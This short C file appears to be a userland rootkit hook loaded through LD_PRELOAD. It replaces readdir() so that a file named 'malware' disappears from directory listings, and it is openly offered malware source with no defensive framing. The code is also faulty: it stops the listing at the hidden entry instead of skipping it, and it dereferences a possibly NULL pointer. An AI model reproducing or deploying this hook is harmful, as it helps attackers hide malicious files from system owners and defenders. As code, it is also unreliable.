#define _GNU_SOURCE
//Hides the file determined by HIDDEN
#define HIDDEN "malware"
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dirent.h>

typedef struct dirent* (*orig_readdir_type)(DIR *dirp);

//Substitute for the *readdir function which reads the next directory entry in the directory stream
struct dirent *readdir(DIR *dirp){

  struct dirent* valueOfReturn;

  //Calls the original readdir
  orig_readdir_type orig_readdir;
  orig_readdir = (orig_readdir_type)dlsym(RTLD_NEXT,"readdir");
  valueOfReturn = orig_readdir(dirp);

  //If HIDDEN file appears, ommit it
  if(strcmp(HIDDEN,valueOfReturn->d_name) == 0){
    return NULL;
  }

  //Else return value of original readdir
  return valueOfReturn;
}
